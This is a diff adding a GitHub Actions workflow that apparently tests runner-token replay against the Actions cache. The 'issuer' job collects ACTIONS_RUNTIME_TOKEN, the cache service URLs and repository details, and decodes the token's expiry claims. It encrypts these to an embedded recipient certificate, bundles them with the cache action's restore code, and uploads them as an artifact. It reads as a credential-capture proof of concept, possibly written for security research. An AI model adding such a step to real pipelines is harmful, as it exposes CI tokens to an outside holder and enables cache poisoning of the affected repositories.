@@ -1,0 +1,165 @@
+name: c7-future-cache-replay
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+
+jobs:
+  baseline:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    cache-mode: write
+    steps:
+      - name: Create baseline canary
+        run: |
+          mkdir -p .cache-c7-baseline
+          printf 'baseline-owned-c7-%s\n' "$GITHUB_RUN_ID" > .cache-c7-baseline/canary.txt
+      - name: Save baseline cache
+        uses: actions/cache/save@v4
+        with:
+          path: .cache-c7-baseline
+          key: c7-baseline-${{ github.run_id }}
+
+  issuer:
+    needs: baseline
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    cache-mode: read
+    steps:
+      - name: B1 restore baseline with current issuer tuple
+        id: restore-baseline
+        uses: actions/cache/restore@v4
+        with:
+          path: .cache-c7-baseline
+          key: c7-baseline-${{ github.run_id }}
+      - name: B1 prove exact baseline bytes
+        run: |
+          test '${{ steps.restore-baseline.outputs.cache-hit }}' = 'true'
+          test "$(cat .cache-c7-baseline/canary.txt)" = "baseline-owned-c7-${GITHUB_RUN_ID}"
+          printf 'b1=exact-baseline-canary\n'
+      - name: Seal issuer tuple before future cache exists
+        uses: actions/github-script@v8
+        env:
+          C7_RECIPIENT_CERT_B64: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUVJekNDQW91Z0F3SUJBZ0lVRWpqQlNBaVVuZzQvb3hlYThvaUtGdy9QdFpZd0RRWUpLb1pJaHZjTkFRRUwKQlFBd0lURWZNQjBHQTFVRUF3d1dZemN0Wm5WMGRYSmxMV05oWTJobExYSmxjR3hoZVRBZUZ3MHlOakE1TVRZeApOVEUyTWpsYUZ3MHlOakE1TVRjeE5URTJNamxhTUNFeEh6QWRCZ05WQkFNTUZtTTNMV1oxZEhWeVpTMWpZV05vClpTMXlaWEJzWVhrd2dnR2lNQTBHQ1NxR1NJYjNEUUVCQVFVQUE0SUJqd0F3Z2dHS0FvSUJnUUNZVGdlS0ZUTncKVEtFbzBSNW5MVkVRSndteHRLSXFmelNRQnNSMTFuQTNGUHB1Q2YyajVXRlJDSHVzKzNWakhuMGZWNG1qS3dtMApsdzBPbXZrcVlQRU8xRXZ6V0xXcEU3cVFsdTI1Y0JyVFBXMWJ5Z0JkZEtZWkMzTFZIWDRYb01ubFowa3Z2UWRSCjdjT2dpeVhPNytWd1hxdzVLdXoxVEw5bGl4N3ZjQTNCc3BEcktwZVgwWjgxRzdyM3VaT2FGN2s5cktXU2UyY24KaXlna0theTdjQVoxK3dpWmN0U2xXYmRPV0crMFJkSXJOSFBhL0VkZ28zeGRlM29rQ0tSSUdudWxleG5uUHpTYQp2Tk5HQWhQOFA4NWNabmNEaHJPYmwwYktWTUtZaEJZMitYeUN2dG55MzFRMFcwemRMeHZlWGdodytNdHhETDJSClROeWY3UUVwUXRMbWZMRzZDb09yU1BuK0hkNnd1bTJOUlNrUGtDcjQ5Y0RrYjhWemhGeUFVUml5VW5yYUhMVXEKTjJSTXRJSk11dUtnSjlyVERPZ2RQNVkxcXJIQmhsOVNSUVFYL1FpNVpOUmZQdzU4QmNQcjRqVStGVVVlRzl4RAptUlRhSXE4VXd4cWZLYUZyOWFhUmg4MEozUlJkRkMrQjBtTnZ5QS81MUJTeWptOStkdDZaWGw4Q0F3RUFBYU5UCk1GRXdIUVlEVlIwT0JCWUVGS0hYQUQxNVRwYy8rVFJQRFRvWDh0Z3c0cE9DTUI4R0ExVWRJd1FZTUJhQUZLSFgKQUQxNVRwYy8rVFJQRFRvWDh0Z3c0cE9DTUE4R0ExVWRFd0VCL3dRRk1BTUJBZjh3RFFZSktvWklodmNOQVFFTApCUUFEZ2dHQkFDMktMZnRDbXVUK2RMb1VXUEJWb1lSVi93OHkwc0U0eTNsRmdRcDFTSTRiTm1WeFlOeHlNSVBtCi9LK0xMem0zRUZEYlkvdkowQkx1SmlKYi9jNFB6VEk5enBiTnNPV2RodDdESXYxaHVicC9wM2VjZUorbitXMkoKVXY3NjJEOTJpdGpBbVVLcWlkUGovRUlFU3hXa0RIbExETHBEWFNTYTZ0dTd3OW4xNDNzZnZNYmI0Z1pORDJvNAorYldEZ3pCajhXQ0N0YkdVZGEyc3BpSHh0WFNCVDhmVGNEdXN6RDVtd0JMaGdNd2ZzZlF4RHlTampHa2tUcHBPCjBQTjZvTzZsdC9TRUdIYnJBcnhvRnUyMTl0ZGdQSnYzSkxPaFJnMCt4VThUSTJySXZXYlI4MkRTTCt4M01COGsKZ25FUzd5alhsMnJpMTVvL0t5TnFtaVhoeEtjcWUzZUFRN00zWVFOUGMyYnd6U0RTOGVpbGpCc205QXpTOGE5bApBN2kvWjk0YVdHYm5WR0JYNnZOeDRsZ0JqN0dMdnhFaElsNDRNYjFUVEg0cGVudDVxM3luN2dCRDJkSk9vSnVqCkMzVEt4WDVwRGRLeGVIVU1JNGNWRStUc2dBak90bnE1T1cwbTdGMVR3dFNmRW1iOUZUN2kzSnNMMEZvUVBZeUUKTjNtbURjOVBHQT09Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K
+        with:
+          script: |
+            const fs = require("fs");
+            const path = require("path");
+            const childProcess = require("child_process");
+            for (const field of ["ACTIONS_RUNTIME_TOKEN", "ACTIONS_RESULTS_URL"]) {
+              if (!process.env[field]) throw new Error(`missing ${field}`);
+            }
+            const bundle = path.join(process.env.GITHUB_WORKSPACE, "c7-replay");
+            const plaintext = path.join(process.env.RUNNER_TEMP, "c7-payload.json");
+            const cert = path.join(process.env.RUNNER_TEMP, "c7-recipient-cert.pem");
+            fs.mkdirSync(bundle, {recursive: true});
+            const fields = [
+              "ACTIONS_RUNTIME_TOKEN",
+              "ACTIONS_CACHE_URL",
+              "ACTIONS_RESULTS_URL",
+              "ACTIONS_CACHE_SERVICE_V2",
+              "ACTIONS_CACHE_MODE",
+              "GITHUB_REF",
+              "GITHUB_REPOSITORY",
+              "GITHUB_SHA",
+              "RUNNER_OS",
+              "RUNNER_ARCH",
+            ];
+            const token = process.env.ACTIONS_RUNTIME_TOKEN;
+            let tokenFormat = "opaque";
+            let tokenClaims = {};
+            const parts = token.split(".");
+            if (parts.length === 3) {
+              try {
+                const padded = parts[1].replace(/-/g, "+").replace(/_/g, "/").padEnd(Math.ceil(parts[1].length / 4) * 4, "=");
+                const decoded = JSON.parse(Buffer.from(padded, "base64").toString("utf8"));
+                tokenFormat = "jwt";
+                for (const name of ["iat", "nbf", "exp", "iss", "aud"]) {
+                  if (Object.prototype.hasOwnProperty.call(decoded, name)) tokenClaims[name] = decoded[name];
+                }
+              } catch (_) {
+                tokenFormat = "three-segment-unparsed";
+              }
+            }
+            fs.writeFileSync(
+              plaintext,
+              JSON.stringify(Object.fromEntries(fields.map(field => [field, process.env[field] || ""]))),
+              {mode: 0o600},
+            );
+            fs.writeFileSync(cert, Buffer.from(process.env.C7_RECIPIENT_CERT_B64, "base64"), {mode: 0o600});
+            childProcess.execFileSync("openssl", [
+              "cms", "-encrypt", "-binary", "-aes-256-cbc",
+              "-in", plaintext,
+              "-out", path.join(bundle, "c7-payload.p7m"),
+              "-outform", "DER",
+              "-recip", cert,
+            ]);
+            fs.rmSync(plaintext);
+            fs.rmSync(cert);
+            const actionRoot = path.resolve(
+              process.env.GITHUB_WORKSPACE,
+              "..", "..", "_actions", "actions", "cache", "v4",
+            );
+            const restoreBundle = path.join(actionRoot, "dist", "restore", "index.js");
+            if (!fs.existsSync(restoreBundle)) throw new Error("restore bundle missing");
+            childProcess.execFileSync("tar", [
+              "-C", actionRoot,
+              "-czf", path.join(bundle, "actions-cache-v4.tgz"),
+              "action.yml", "dist/restore/index.js",
+            ]);
+            fs.writeFileSync(
+              path.join(bundle, "metadata.json"),
+              JSON.stringify({
+                baselineKey: `c7-baseline-${process.env.GITHUB_RUN_ID}`,
+                futureKey: `c7-future-${process.env.GITHUB_RUN_ID}`,
+                futureCanary: `future-owned-c7-${process.env.GITHUB_RUN_ID}`,
+                issuerCaptureUtc: new Date().toISOString(),
+                tokenFormat,
+                tokenClaims,
+              }),
+            );
+      - name: Upload encrypted issuer carrier
+        uses: actions/upload-artifact@v4
+        with:
+          name: c7-replay-${{ github.run_id }}
+          path: c7-replay/
+          if-no-files-found: error
+          retention-days: 1
+
+  future-writer:
+    needs: issuer
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    cache-mode: write
+    steps:
+      - name: Create future canary after issuer completion
+        run: |
+          mkdir -p .cache-c7-future
+          printf 'future-owned-c7-%s\n' "$GITHUB_RUN_ID" > .cache-c7-future/canary.txt
+      - name: Save future cache
+        uses: actions/cache/save@v4
+        with:
+          path: .cache-c7-future
+          key: c7-future-${{ github.run_id }}
+
+  future-control:
+    needs: future-writer
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    cache-mode: read
+    steps:
+      - name: B1 restore future cache with fresh token
+        id: restore-future
+        uses: actions/cache/restore@v4
+        with:
+          path: .cache-c7-future
+          key: c7-future-${{ github.run_id }}
+      - name: B1 prove exact future bytes
+        run: |
+          test '${{ steps.restore-future.outputs.cache-hit }}' = 'true'
+          test "$(cat .cache-c7-future/canary.txt)" = "future-owned-c7-${GITHUB_RUN_ID}"
+          printf 'b1=future-exact-canary\n'
+
